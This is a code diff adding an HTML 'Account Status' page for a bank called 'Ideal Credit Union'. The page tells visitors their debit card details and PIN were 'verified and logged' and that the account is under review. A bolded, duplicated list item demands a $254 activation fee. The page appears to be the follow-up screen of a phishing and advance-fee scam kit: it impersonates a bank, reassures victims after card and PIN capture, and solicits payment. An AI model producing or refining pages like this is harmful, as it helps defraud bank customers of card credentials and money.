@@ -1,0 +1,59 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Ideal Credit Union - Account Status</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+</head>
+<body class="bg-slate-100 font-sans text-slate-800 min-h-screen p-4 md:p-8 flex justify-center">
+    
+    <div class="max-w-2xl w-full bg-white rounded-xl shadow-lg overflow-hidden border border-slate-200 h-fit">
+        <!-- Header -->
+        <div class="bg-blue-900 text-white p-6 flex justify-between items-center">
+            <h1 class="text-xl font-bold tracking-wide">Ideal Credit Union</h1>
+            <span class="text-xs font-semibold bg-blue-800 px-3 py-1 rounded-full uppercase tracking-wider">Secure Portal</span>
+        </div>
+
+        <div class="p-6 md:p-8">
+            <!-- Success Banner -->
+            <div class="bg-green-50 border border-green-200 text-green-800 rounded-lg p-4 mb-6 flex items-start">
+                <svg class="w-6 h-6 mr-3 mt-0.5 text-green-600 flex-shrink-0" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7"></path></svg>
+                <div>
+                    <h3 class="font-bold text-lg">Thank You for Your Verification</h3>
+                    <p class="text-sm mt-1">Your debit card details and PIN have been successfully securely verified and logged.</p>
+                </div>
+            </div>
+
+            <!-- Under Review Status -->
+            <div class="bg-amber-50 border border-amber-200 text-amber-900 rounded-lg p-6 mb-8 text-center shadow-inner">
+                <svg class="w-12 h-12 mx-auto mb-3 text-amber-500" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 8v4l3 3m6-3a9 9 0 11-18 0 9 9 0 0118 0z"></path></svg>
+                <h2 class="text-xl font-bold mb-2">Account Currently Under Review</h2>
+                <p class="text-sm mb-5 text-amber-800">Our security team is currently reviewing your recent activation request to ensure the safety of your account.</p>
+                
+                <div class="bg-white p-4 rounded-md border border-amber-200 text-left text-sm shadow-sm">
+                    <strong class="block mb-2 text-slate-700">What happens next?</strong>
+                    <ul class="list-disc pl-5 space-y-2 text-slate-600">
+                        <li>The review process typically takes a few minutes to 24 hours.<b>The review process typically takes a few minutes to 24 hours. A standard $254 fee is required to activate the card.</b>                      
+                        <li>You will receive an email notification as soon as the review & payment is finalized and your card is fully active.</li>
+                        <li>Standard online banking transfers, digital wallet provisioning, and external purchases will remain restricted until the hold is lifted.</li>
+                    </ul>
+                </div>
+            </div>
+
+            <!-- Credit Limit Section Placeholder -->
+            <div class="border-t border-slate-200 pt-6">
+                <h3 class="text-lg font-semibold text-slate-800 mb-2">Credit Limit Management</h3>
+                <div id="creditLimitSection" class="p-4 bg-slate-50 border border-slate-200 rounded-lg text-center text-slate-500 text-sm">
+                    [Credit Limit Increase  ]
+                </div>
+            </div>
+            
+            <div class="mt-6 text-center">
+                <a href="index.html " class="text-blue-700 hover:text-blue-900 text-sm font-semibold">Return to Main Dashboard</a>
+            </div>
+        </div>
+    </div>
+
+</body>
+</html>
